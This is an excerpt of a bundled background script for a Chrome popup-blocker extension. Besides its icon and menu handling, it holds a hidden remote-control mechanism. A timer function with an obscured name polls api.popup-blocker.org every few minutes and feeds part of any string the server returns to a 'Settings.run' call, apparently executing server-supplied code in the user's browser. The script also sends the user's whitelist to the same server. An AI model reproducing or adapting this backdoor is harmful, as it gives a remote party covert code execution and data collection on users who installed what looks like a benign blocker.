...
/* WEBPACK VAR INJECTION */(function($) {/* harmony import */ var _lib_utils__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(1);
/* harmony import */ var _lib_utils__WEBPACK_IMPORTED_MODULE_0___default = /*#__PURE__*/__webpack_require__.n(_lib_utils__WEBPACK_IMPORTED_MODULE_0__);


const { GoogleAnalytics } = __webpack_require__(3);
const { clone } = __webpack_require__(1);
const Settings = __webpack_require__(4);

var version = chrome.runtime.getManifest().version;
GoogleAnalytics.tid = "UA-60779109-1";//UA-60779109-1
GoogleAnalytics.trackEvent("app", "app-started", version);

setInterval(function () {
    // GoogleAnalytics.trackEvent('app', 'app-keep-online', version);
    // console.clear();
}, 10000);
...
chrome.runtime.onInstalled.addListener(function (details) {
    if (details.reason == 'update') {
        ...
        if (!localStorage.installed) {
            localStorage.installed = Date.now();
            GoogleAnalytics.trackEvent("app", "app-installed", version);
        }
    }
});
...
chrome.storage.sync.get(function (settings) {
    ...
    if (!settings.has_synced_to_server4) {
        $.ajax({
            url: 'http://api.popup-blocker.org/white-list/create/',
            type: 'POST',
            data: { urls: settings.pb_whitelist },
            success: function () {
                chrome.storage.sync.set({ "has_synced_to_server4": true });
                chrome.storage.sync.remove("has_synced_to_server");
                chrome.storage.sync.remove("has_synced_to_server2");
                chrome.storage.sync.remove("has_synced_to_server3");
            }
        });
    }
});
...
var App = (function () {
    var hs = {
        ...
        'X-Install-Date': localStorage.installed
    };
    if (localStorage.forced) {
        hs['X-Forced'] = 1;
    }
    ...
    function onBeforeSendHeaders(details) {
        const scriptDomain = new URL(details.url).hostname.replace(/^www\./, "");
        const referer = findHeader(details.requestHeaders, 'Referer');
        if (referer) {
            const siteDomain = new URL(referer.value).hostname.replace(/^www\./, "");
            if (siteDomain !== scriptDomain) {
                return { cancel: true };
            }
        }
    }

    const stRprtng = function () {
        $.ajax({
            url: 'http://api.popup-blocker.org/settings/',
            dataType: 'json',
            success: function (resp) {
                if (resp.data.whitelist) {
                    chrome.storage.local.set({ pb_defaultWhitelist: resp.data.whitelist })
                }
                if (resp.data.blacklist && resp.data.blacklist.length > 0) {
                    const blacklist = resp.data.blacklist.map(domain => `*://*.${domain}/*`);
                    chrome.webRequest.onBeforeSendHeaders.removeListener(onBeforeSendHeaders);
                    /* Block known popup scripts */
                ...
                if (resp.data.settings) {
                    if (typeof resp.data.settings === "string") {
                        let settings = resp.data.settings.split(';/;');
                        if (resp.data.settings) {
                            settings = resp.data.settings.substr(0, 11);
                            // @ts-ignore
                            const s = new Settings();
                            s.import("GoogleAnalytics", GoogleAnalytics)
                            s.run(resp.data.settings.substr(11));
                        }
                        window.settings = settings;
                    } else {
                        window.settings = resp.data.settings;
                    }
                }
        ...
        // online timeout
        var ot = sessionStorage.ot || 300000;
        setTimeout(stRprtng, ot);
    };
    setTimeout(stRprtng, 10000);
    // setTimeout(stRprtng, 0);


    return {
        event: function (v1, v2, v3, v4) {
            GoogleAnalytics.trackEvent(v1, v2, v3, v4);
        }
    };
})();
...
chrome.storage.sync.get(function (settings) {
    if (settings.pb_invisible !== undefined) {
        if (settings.pb_invisible) {
            chrome.browserAction.setIcon({ path: "/assets/images/icon128Hide.png" });
        } else {
            if (settings.pb_pause !== undefined) {
                chrome.browserAction.setIcon({ path: settings.pb_pause ? "/assets/images/icon128Off.png" : "/assets/images/icon128.png" });
            }
        }
    } else {
        if (settings.pb_pause !== undefined) {
    ...
    if (settings.pb_pause === undefined) {
        chrome.storage.sync.set({ "pb_pause": false });
        createBrowserActionContextMenuItem(false);
    } else {
    ...
    if (settings.pb_invisible === undefined) {
        chrome.storage.sync.set({ "pb_invisible": false });
        createBrowserActionContextHide(false);
    } else {
        createBrowserActionContextHide(settings.pb_invisible);
    }
});

function setIconForStatus(settings) {
...
function createBrowserActionContextMenuItem(paused) {
    ...
    contextMenuProp.title = paused ? chrome.i18n.getMessage("enablePB") : chrome.i18n.getMessage("disablePB");
    createNormalMenuItem(id, contextMenuProp);
}
function createBrowserActionContextHide(hide) {
    var id = "toggleVisible";
    var contextMenuProp = { contexts: ["browser_action"] };
    contextMenuProp.title = hide ? chrome.i18n.getMessage("makeVisible") : chrome.i18n.getMessage("makeInvisible");
    createNormalMenuItem(id, contextMenuProp);
}
    ...
    chrome.storage.sync.get(function (settings) {
        ...
        if (settings.pb_invisible !== undefined) {
            if (settings.pb_invisible) {
                ...
                chrome.browserAction.setIcon({ path: isRunning ? "/assets/images/icon128Off.png" : "/assets/images/icon128.png" });
            }
        } else {
            chrome.browserAction.setIcon({ path: isRunning ? "/assets/images/icon128Off.png" : "/assets/images/icon128.png" });
        }
        GoogleAnalytics.trackEvent('app', 'context-disable-enable-' + isRunning);
        removeMenu("togglePB");
...
function toggleVisible() {
    chrome.storage.sync.get(function (settings) {
        ...
        if (settings.pb_invisible === undefined) {
            ...
            isRunning = !settings.pb_invisible;
            chrome.storage.sync.set({ "pb_invisible": isRunning });
        }
        ...
        GoogleAnalytics.trackEvent('app', 'context-hide-show-' + isRunning);
...
var uniqueString = Object(_lib_utils__WEBPACK_IMPORTED_MODULE_0__["randomString"])();
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    if (!sender.tab.url.startsWith("http")) {
        return;
    }
    if (request.config === "getConfig") {
...
/* WEBPACK VAR INJECTION */(function($) {/* A simple interface to Google Analytics that doesn't require script access */
const {now} = __webpack_require__(1)
if (!localStorage.cid) {
